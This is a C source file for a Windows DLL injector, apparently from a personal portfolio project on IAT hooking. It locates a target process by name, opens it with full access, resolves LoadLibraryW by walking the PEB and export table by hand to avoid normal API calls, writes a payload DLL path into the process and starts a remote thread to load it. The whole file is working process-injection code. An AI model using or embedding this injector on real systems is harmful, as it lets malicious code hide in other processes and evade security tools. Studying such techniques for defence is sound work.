#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>

#define WHITE 0x7
#define GREEN 0x2
#define RED 0x4
#define PE_SIGNATURE 0x4550


PPEB getPEB() {
    return (PPEB)__readgsqword(0x60);  // For x64
}

void setColor(WORD color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

//* Custom implementation of GetModuleHandleA
PVOID getModuleBase(wchar_t *moduleName) {
    //? Go through PEB structure to reach the module list
    PPEB pPeb = getPEB();
    PEB_LDR_DATA *Ldr = pPeb->Ldr;
    
    PLIST_ENTRY firstFlink = Ldr->InMemoryOrderModuleList.Flink;
    PLIST_ENTRY currentFlink = firstFlink;

    LDR_DATA_TABLE_ENTRY *firstEntry = (LDR_DATA_TABLE_ENTRY*)((ULONG_PTR)firstFlink-0x10); // Flink doesn't point to start of table
    LDR_DATA_TABLE_ENTRY *currentEntry = firstEntry;

    UNICODE_STRING *modName = (UNICODE_STRING *)((ULONG_PTR)firstEntry + 0x58); // BaseDllName

    //? First module is the executable the process was launched from
    if (moduleName == NULL) {
        setColor(GREEN);
        printf("\n[+] Found %ls!\n", modName->Buffer);
        setColor(WHITE);
        return *(PVOID*)((ULONG_PTR)firstEntry + 0x30); // DllBase
    }

    //? Loop through InMemoryOrderModuleList until you find the correct module
    do {
        if (_wcsicmp(modName->Buffer, moduleName) == 0) {
            PVOID imageBase = *(PVOID*)((ULONG_PTR)currentEntry + 0x30); // DllBase
            setColor(GREEN);
            printf("\n[+] Found %ls!\n", modName->Buffer);
            setColor(WHITE);
            return imageBase;
        }
        //? move to next one
        currentFlink = currentFlink->Flink;
        currentEntry = (LDR_DATA_TABLE_ENTRY*)((ULONG_PTR)currentFlink - 0x10);
        modName = (UNICODE_STRING*)((ULONG_PTR)currentEntry + 0x58);
    } while (currentFlink != firstFlink);

    setColor(RED);
    printf("\n[!] Couldn't find module \"%ls\"", moduleName);
    setColor(WHITE);
    return NULL;
}


//* Custom implementation of GetProcAddress
PVOID getFuncAddress(PVOID moduleBase, LPCSTR funcName) {
    printf("[i] Getting address of %s...\n", funcName);
    //? Parse PE headers located at moduleBase in memory, to get the Export Address Table
    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)moduleBase + dosHeaders->e_lfanew);
    if (ntHeaders->Signature != PE_SIGNATURE) {
        setColor(RED);
        printf("\n[!] Incorrect PE signature!\n");
        setColor(WHITE);
        return NULL;
    }
    printf("[i] PE file signature: %#X\n", ntHeaders->Signature);

    PIMAGE_EXPORT_DIRECTORY exportsDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)moduleBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (!exportsDirectory) {
        setColor(RED);
        printf("\n[!] No export directory found.\n");
        setColor(WHITE);
        return FALSE;
    }    

    DWORD NumberOfNames = exportsDirectory->NumberOfNames;
    PDWORD AddressOfFunctions = (PDWORD)((ULONG_PTR)moduleBase+(ULONG_PTR)exportsDirectory->AddressOfFunctions);
    PDWORD AddressOfNames = (PDWORD)((ULONG_PTR)moduleBase+(ULONG_PTR)exportsDirectory->AddressOfNames);
    PDWORD AddressOfNameOrdinals = (PDWORD)((ULONG_PTR)moduleBase+(ULONG_PTR)exportsDirectory->AddressOfNameOrdinals);

    //? Loop through AddressOfNames until you find funcName (at AddressOfNames[i])
    //? The address of the function can be found at AddressOfFunctions[ordinal], with ordinal at AddressOfNameOrdinals[i]
    for (DWORD i = 0; i < NumberOfNames; i++) {
        char* fName = (char*)((unsigned char*)moduleBase + AddressOfNames[i]);
        if (strcmp(fName, funcName) == 0) {
            //? AddressOf_[n] does not work, have to do it this way
            WORD ordinal = *((WORD*)((ULONG_PTR)AddressOfNameOrdinals + i*sizeof(WORD)));
			DWORD fRVA = *((DWORD*)((ULONG_PTR)AddressOfFunctions + ordinal*sizeof(DWORD)));
            setColor(GREEN);
            printf("\n[+] Found %s!\n\t\\==={ Address: %#X\n", fName, (ULONG_PTR)moduleBase+fRVA);
            setColor(WHITE);
            return (PVOID)((ULONG_PTR)moduleBase+fRVA);
        }
    }
    return NULL;
}

HANDLE ProcessEnumerateAndSearch(char* ProcessName) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) }; // According to documentation the size must be set

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[X] CreateToolhelp32Snapshot has failed with error %d\n", GetLastError());
        return NULL;
    }

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (strcmp(pe.szExeFile, ProcessName) == 0) {
                printf("Process PID: %d has been opened\n", pe.th32ProcessID);
                return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return NULL;
}

BOOL InjectDLL(HANDLE hProcess, PWCHAR dllName) {
    LPVOID pLibAddr;
    SIZE_T szWrittenBytes;
    HANDLE hThread;    

    // Locating the LoadLibrary DLL
    PVOID k32Base = getModuleBase(L"kernel32.dll");
    printf("[+] Got kernel32.dll base: %#X\n", k32Base);
    PVOID pLoadLibrary = getFuncAddress(k32Base, "LoadLibraryW");
    if (pLoadLibrary == NULL) {
        printf("\n[!] Failed to get LoadLibrary address\n");
        return FALSE;
    }
    printf("[+] Got LoadLibrary address: %#X\n", pLoadLibrary);

    // Allocating memory into the target process
    pLibAddr = VirtualAllocEx(hProcess, NULL, (wcslen(dllName)+1) * sizeof(WCHAR), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pLibAddr == NULL) {
        printf("\n[!] VirtualAllocEX failed: %d\n", GetLastError());
        return FALSE;
    }
    
    // Writing into the target process the dll payload name
    if (!WriteProcessMemory(hProcess, pLibAddr, dllName, (wcslen(dllName)+1) * sizeof(WCHAR), &szWrittenBytes)) {
        printf("\n[!] WriteProcessMemory failed: %d\n", GetLastError());
        return FALSE;
    }
    printf("[i] Wrote %d bytes to remote process\n",  szWrittenBytes);
    
    // Run a thread into the target process that will load the payload through LoadLibraryW

    hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary, pLibAddr, 0, NULL);
    if (hThread == NULL) {
        printf("Error in CreateRemoteThread: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

int main(int argc, char **argv) {
    if (argc < 2) {
    printf("Usage: %s <input_string>\n", argv[0]);
    return 1;
    }
    // Get the length of argv[1] in characters
/*    size_t inputLength = strlen(argv[1]);

    // Allocate memory for the wide string (including null terminator)
    PWCHAR wName = (PWCHAR)malloc((inputLength + 1) * sizeof(WCHAR));
    if (!wName) {
        printf("Memory allocation failed\n");
        return 1;
    }

    // Convert the input string to wide characters
    size_t convertedChars = 0;
    mbstowcs_s(&convertedChars, wName, inputLength + 1, argv[1], _TRUNCATE);
    wprintf(L"Converted string: %ls\n", wName);
*/
    HANDLE hProcess = ProcessEnumerateAndSearch(argv[1]);
 //   free(wName);
    if (hProcess == NULL) {
        setColor(RED);
        printf("\n[!] Failed to get process handle\n");
        setColor(WHITE);
        return -1;
    }

    BOOL ok = InjectDLL(hProcess, L"D:\\koodi\\portfolio\\iathook\\payload.dll");
    if (!ok) {
        printf("\n[!] Failed to inject DLL\n");
        return -1;
    }

    return 1;
}